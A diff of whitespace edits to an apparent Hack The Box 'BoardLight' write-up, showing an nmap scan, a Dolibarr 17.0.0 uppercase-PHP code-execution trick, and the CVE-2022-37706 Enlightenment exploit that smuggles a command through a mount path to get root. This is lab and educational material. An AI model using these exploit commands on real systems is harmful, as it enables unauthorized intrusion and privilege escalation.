@@ -34,7 +34,6 @@ BoardLight is an easy difficulty Linux machine that features a `Dolibarr` instan
 ## Nmap
 
 ```bash
-
 # Nmap 7.94SVN scan initiated Tue May 28 00:34:58 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, BoardLight
 Nmap scan report for BoardLight (10.129.146.45)
 Host is up, received user-set (0.29s latency).
@@ -58,7 +57,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Tue May 28 00:35:17 2024 -- 1 IP address (1 host up) scanned in 18.87 seconds
 ```
 
@@ -147,6 +145,7 @@ http://crm.board.htb/website/index.php [200] [Login @ 17.0.0] [Apache/2.4.41 (Ub
 > https://www.swascan.com/security-advisory-dolibarr-17-0-0/
 
 > **Brief exploit explanation**
+> 
 > - Admin account can create websites, but can't insert `php` codes like `<?php...?>`
 > - However, a test function allows php codes to be executed by turning the `php` tag to upper case, example : `<?PHP phpinfo(); ?>`
 {: .prompt-tip }
@@ -360,13 +359,13 @@ Change: 2024-05-17 01:04:37.726605889 -0700
 > Writeup + POC - https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
 
 > **Brief exploit explanation**
+> 
 > It's a command injection vulnerability in file path
 {: .prompt-info }
 
 > https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh
 
 ```bash
-
 #!/bin/bash
 
 echo "CVE-2022-37706"
@@ -401,10 +400,8 @@ larissa@boardlight:~$ echo "/bin/sh" > /tmp/e
 larissa@boardlight:~$ chmod a+x /tmp/e
 larissa@boardlight:~$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/e" /tmp///net
 mount: /dev/../tmp/: can't find in /etc/fstab.
-
 # id
 uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
-
 # cat /root/root.txt
 58e9ba0508bafae521d5141b4ead1260
 ```
